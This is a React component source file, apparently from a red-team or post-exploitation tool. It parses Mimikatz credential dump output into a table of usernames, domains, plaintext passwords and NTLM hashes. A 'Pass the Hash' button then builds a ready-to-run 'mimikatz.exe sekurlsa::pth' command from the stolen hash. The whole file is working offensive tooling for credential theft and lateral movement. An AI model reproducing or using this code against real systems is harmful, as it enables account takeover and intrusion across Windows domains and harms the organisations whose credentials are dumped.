import React from "react";
import { Button } from "@material-ui/core";
import Typography from "@material-ui/core/Typography";
import Helper from "./Helper";
export default ({ data, setOpenHelper, openHelper }) => {
  let [PTH, setPTH] = React.useState(``);
  let usernames = data.split("Username :");
  let listedUsernames = usernames
    .filter(
      (user) => user.split("\n")[1] && user.split("\n")[0][0].includes(" ")
    )
    .map((user) => (
      <tr>
        <td>{user.split("\n")[0]}</td>
        <td>
          {user.split("Domain   :")[1] &&
            user.split("Domain   :")[1].split("\n")[0]}
        </td>
        <td>
          {user.split("Password :")[1]
            ? user.split("Password :")[1].split("\n")[0]
            : "-"}
        </td>
        <td>
          {user.split("NTLM     :")[1]
            ? user.split("NTLM     :")[1].split("\n")[0]
            : "-"}
        </td>
        <td>
          <Button
            onClick={() => {
              setPTH(
                `mimikatz.exe "sekurlsa::pth /user:${
                  user.split("\n")[0]
                } /domain:${user.split("Domain   :")[1].split("\n")[0]} /ntlm:${
                  user.split("NTLM     :")[1].split("\n")[0]
                }"`
              );
              setOpenHelper(true);
            }}
          >
            Pass the Hash
          </Button>
        </td>
      </tr>
    ));
  try {
    return (
      <div>
        <table>
          <tr>
            <th>Username</th>
            <th>Domain</th>
            <th>Password</th>
            <th>NTLM</th>
            <th>PTH</th>
          </tr>
          {listedUsernames}
        </table>
        <Helper openHelper={openHelper} setOpenHelper={setOpenHelper}>
          <Typography variant="h6" style={{ flexGrow: 1, paddingTop: 10 }}>
            {PTH}
          </Typography>
        </Helper>
      </div>
    );
  } catch (e) {
    return <></>;
  }
};
